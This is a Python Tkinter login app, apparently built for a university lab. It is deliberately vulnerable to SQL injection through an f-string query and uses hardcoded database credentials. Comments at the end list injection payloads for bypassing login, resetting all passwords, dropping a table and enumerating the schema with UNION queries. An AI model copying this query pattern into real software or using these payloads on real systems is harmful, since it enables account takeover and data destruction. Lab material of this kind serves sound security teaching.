import tkinter as tk
from tkinter import messagebox
import mysql.connector

# --- UI Setup ---
window = tk.Tk()
window.title("University Lab - Vulnerable Login")
window.geometry('600x400')
window.configure(bg="#f0f0f0")

# Main title label
title_label = tk.Label(window, text="Insecure Login Page", font=("Arial", 20, "bold"), bg='#f0f0f0')
title_label.pack(pady=(20, 15))

# Frame for input fields
input_frame = tk.Frame(window, bg='#f0f0f0')
input_frame.pack(pady=10)

# Username Entry
tk.Label(input_frame, text="Username:", font=("Arial", 12), bg='#f0f0f0').grid(row=0, column=0, padx=5, pady=5, sticky='w')
username_entry = tk.Entry(input_frame, width=30, font=("Arial", 12))
username_entry.grid(row=0, column=1, padx=5, pady=5)

# Password Entry
tk.Label(input_frame, text="Password:", font=("Arial", 12), bg='#f0f0f0').grid(row=1, column=0, padx=5, pady=5, sticky='w')
password_entry = tk.Entry(input_frame, width=30, show='*', font=("Arial", 12))
password_entry.grid(row=1, column=1, padx=5, pady=5)

# --- Login Logic ---
def handle_login():
    """
    This function handles the login attempt.
    It contains a critical SQL injection vulnerability.
    """
    username = username_entry.get()
    password = password_entry.get()

    db = None # Initialize db to None so it can be accessed in the finally block
    try:
        # Establish a connection to the database
        db = mysql.connector.connect(
            host="localhost",
            user="admin",
      
            password="root",
            database="injection"
        )
        cursor = db.cursor()

        # =================================================================
        # CRITICAL VULNERABILITY: SQL QUERY CONSTRUCTION
        # =================================================================
        # The query is built by directly inserting the user's input (username and password)
        # into the SQL string using an f-string. This is highly insecure.
        # An attacker can type SQL commands into the input fields to manipulate
        # the database query and bypass the login check or perform other actions.
        query = f"SELECT Username FROM login WHERE Username='{username}' AND Password='{password}'"
        
        # We print the query to the terminal so you can see how the injection attack changes it.
        # This is for educational purposes.
        print(f"Executing Vulnerable Query: {query}")

        # Your version of the mysql.connector library might not support multiple statements
        # in a single .execute() call by default. This setup still allows for injections.
        cursor.execute(query)
        
        # The first result is from our intended SELECT statement.
        # FIX: It's crucial to fetch the result BEFORE committing the transaction.
        # The previous code committed first, which discarded the results of the SELECT query.
        result = cursor.fetchone()

        # We must commit the transaction to save any potential changes from an
        # injection attack (like an UPDATE statement), which is required for your lab.
        db.commit()
        
        if result:
            # If a result is found, the login is considered successful.
            messagebox.showinfo("Login Status", f"Welcome, {result[0]}! Login Successful.")
        else:
            # If no result is found, the login fails.
            messagebox.showerror("Login Status", "Login Failed: Invalid username or password.")

    except mysql.connector.Error as err:
        # This will catch any errors from the database itself (e.g., connection failed)
        messagebox.showerror("Database Error", f"An error occurred: {err}")
    finally:
        # This block ensures the database connection is always closed,
        # whether the login was successful or not.
        if db and db.is_connected():
            cursor.close()
            db.close()
            print("Database connection closed.")


# Login Button
login_button = tk.Button(window, text="Login", command=handle_login, font=("Arial", 14, "bold"), bg='#4CAF50', fg='white', padx=20, pady=10)
login_button.pack(pady=20)


# Start the application's main loop
window.mainloop()

#to Bypass the login try: Hassan' OR '1'='1
#to update the password try:  x'; UPDATE login SET Password='hacked' WHERE Username='Turky'; --
#to know the DB name: 1234' AND 1=(SELECT COUNT(*) FROM Username); --
#if gives syntax error the table name is exest:  1234' OR username LIKE '%OS%'; --
#to know the number of columns:  ' ORDER BY 3; --
#to drop a table:  x'; DROP TABLE login; --
# SELECT Username FROM login WHERE Username='x'; UPDATE login SET Password='hacked' WHERE Username='Turky'; --' AND Password='{password}'
#to ubdate the user have t char try: x'; UPDATE login SET Password='pass' WHERE Username LIKE '%T%'; --
#to chanege all the passwords: x'; UPDATE login SET Password='pass' WHERE Username LIKE '%%'; --
#to know DB name Directly : x' UNION SELECT DATABASE(); --
#to know how many tables: ' UNION SELECT COUNT(*) FROM information_schema.tables WHERE table_schema = 'injection' --  